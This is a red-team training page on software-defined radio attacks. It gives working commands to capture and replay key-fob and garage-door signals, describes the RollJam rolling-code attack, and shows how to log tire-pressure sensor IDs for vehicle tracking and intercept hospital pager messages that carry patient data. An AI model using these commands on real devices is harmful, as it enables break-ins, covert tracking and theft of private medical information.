---
layout: training-page
title: "SDR Attacks — Red Team Academy"
module: "Wireless"
tags:
  - sdr
  - rtl-sdr
  - hackrf
  - gnuradio
  - replay-attack
  - rf
  - wireless
page_key: "wireless-sdr"
render_with_liquid: false
---

# SDR Attacks

Software Defined Radio (SDR) replaces traditional hardware radio components with software, enabling a single device to receive, analyze, and transmit across a huge frequency range. For red teamers, SDR enables analysis and exploitation of RF protocols used by gate openers, car key fobs, alarm systems, pagers, weather stations, and building access control systems.

## Hardware

```
RTL-SDR (receive only)
  Cost: ~$25
  Frequency: 500 kHz – 1.75 GHz
  Use: passive monitoring, signal analysis, replay prep
  Buy: rtl-sdr.com

HackRF One (receive + transmit)
  Cost: ~$300
  Frequency: 1 MHz – 6 GHz
  Use: replay attacks, signal injection, jamming research
  Buy: greatscottgadgets.com/hackrf

YARD Stick One
  Cost: ~$100
  Frequency: 300–348 MHz, 391–464 MHz, 782–928 MHz (sub-GHz focus)
  Use: targeted sub-GHz attacks; pairs with rfcat
  Buy: greatscottgadgets.com/yardstickone

USRP B200/B210 (research grade)
  Cost: $700–$1100
  Frequency: 70 MHz – 6 GHz
  Use: high-fidelity research, LTE/5G analysis, GNU Radio integration
```

## Software Stack

```bash
# Core tools
apt install rtl-sdr hackrf gnuradio gqrx

# Signal analysis and visualization
# GQRX — spectrum analyzer and waterfall display
gqrx

# SDR++ — modern multi-platform spectrum analyzer
# github.com/AlexandreRouma/SDRPlusPlus

# Universal Radio Hacker (URH) — analyze, decode, and replay RF signals
pip install urh
urh

# Inspectrum — deep signal inspection
apt install inspectrum

# GNU Radio Companion — block-based RF processing
gnuradio-companion
```

## Signal Analysis Workflow

```bash
# 1. Find the frequency
# Check FCC ID database for the device (fccid.io — enter FCC ID from device label)
# Common frequencies:
#   315 MHz  — US car key fobs, garage doors
#   433.92 MHz — European key fobs, sensors, alarm sensors
#   868 MHz  — European IoT
#   915 MHz  — US ISM band (Z-Wave, LoRa, various sensors)
#   2.4 GHz  — Wi-Fi, Zigbee, Bluetooth
#   5.8 GHz  — Wi-Fi, some cordless phones

# 2. Open GQRX, set frequency, observe waterfall
gqrx
# Tune to suspected frequency
# Press the button/trigger you want to capture
# Watch for signal burst in waterfall — note center frequency

# 3. Capture raw IQ data with rtl_sdr
rtl_sdr -f 433920000 -s 2000000 -n 10000000 capture.bin
# -f = frequency in Hz
# -s = sample rate
# -n = number of samples

# 4. Load in Universal Radio Hacker for analysis
urh capture.bin
# URH auto-detects modulation (OOK, FSK, etc.)
# Demodulate → shows bit stream
# Analyze for patterns (preamble, length field, command bytes, checksum)
```

## Replay Attacks

```bash
# Simple replay: capture transmission → retransmit identical signal
# Works against: simple remotes, garage doors, older car keys (no rolling code)
# Does NOT work against: rolling code (KeeLoq, HiTag2 in modern cars)

# Capture with HackRF
hackrf_transfer -r capture.bin -f 433920000 -s 2000000

# Replay with HackRF
hackrf_transfer -t capture.bin -f 433920000 -s 2000000 -x 47

# With YARD Stick One + rfcat
rfcat -r
d.setFreq(433920000)
d.setMdmModulation(MOD_OOK)
d.RFxmit(captured_bytes)

# URH — built-in replay via HackRF/RTL-SDR
# After decoding: Generate → Transmit → select HackRF interface
```

## Rolling Code Attacks

```bash
# Rolling codes (KeeLoq, HiTag2) change with each use — replay won't work
# Known attacks:

# RollJam (Samy Kamkar)
# Simultaneously jam the legitimate signal + record both presses
# Victim thinks fob didn't work → presses twice
# Attacker has code 1 (captured, never used by door) and code 2 (used, expired)
# Attacker replays code 1 → door opens (it's the next valid code)
# Hardware: two SDR receivers + jammer + controller

# Rolljam implementation:
# github.com/exploitagency/github-rolljam (research/educational)

# KeeLoq key recovery (if you can get ~65,536 plaintext/ciphertext pairs)
# Requires manufacturer key — not practical without insider access
```

## TPMS (Tire Pressure Monitoring)

```bash
# TPMS sensors broadcast at 315/433 MHz
# Contains: sensor ID, tire pressure, temperature, wheel position
# Used for vehicle tracking — each car has unique sensor IDs

# tpms-rx — capture TPMS signals
# github.com/bartkessels/tpms
rtl_433 -f 315M  # or rtl_433 (auto-detects many protocols)

# rtl_433 — universal RF protocol decoder
apt install rtl-433
rtl_433  # auto-scan at 433.92 MHz
rtl_433 -f 315000000  # 315 MHz
rtl_433 -f 433920000 -R 59  # protocol 59 = TPMS

# Output includes sensor ID, pressure, temperature
# Note sensor IDs for vehicle tracking
```

## Pager Interception (POCSAG/FLEX)

```bash
# Hospital pagers transmit patient data in cleartext at 152-160 MHz
# POCSAG protocol: widely used for one-way paging

# Capture pager messages
rtl_433 -f 152350000 -R 130  # POCSAG protocol 130 in rtl_433

# Or with multimon-ng
rtl_sdr -f 152350000 -s 22050 - | sox -t raw -r 22050 -e s -b 16 -c 1 - -t raw - \
  rate 22050 | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -

# Messages often contain patient names, room numbers, test results
# Common finding in hospital/healthcare red team engagements
```

## ADS-B — Aircraft Transponders

```bash
# ADS-B at 1090 MHz broadcasts aircraft ID, GPS position, altitude, speed
# Not an attack vector — useful for wardriving/positioning context

dump1090 --interactive
# Visualize on map: fr24feed, tar1090

# Also useful: ATC voice on 118-136 MHz (civil aviation VHF)
```

## Resources

- RTL-SDR — `rtl-sdr.com`
- HackRF — `greatscottgadgets.com/hackrf`
- Universal Radio Hacker — `github.com/jopohl/urh`
- rtl_433 — `github.com/merbanan/rtl_433`
- GQRX — `gqrx.dk`
- RollJam (Samy Kamkar) — `samy.pl/rolljam/`
